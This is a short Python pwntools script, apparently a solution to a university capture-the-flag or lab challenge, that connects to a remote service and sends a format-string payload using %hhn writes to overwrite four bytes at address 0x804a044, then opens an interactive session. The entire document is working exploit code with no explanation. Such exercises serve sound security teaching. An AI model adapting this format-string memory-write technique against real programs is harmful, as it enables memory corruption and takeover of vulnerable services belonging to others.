from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22195)

adr = 0x804a044

payload =  p32(adr+3) + b'%11c' + b'%007$hhn'
payload += p32(adr+1) + b'%07c' + b'%011$hhn'
payload += p32(adr+2) + b'%65c' + b'%015$hhn'
payload += p32(adr)   + b'%70c' + b'%019$hhn'

s.sendline(payload)
print(s.recvline())

s.interactive()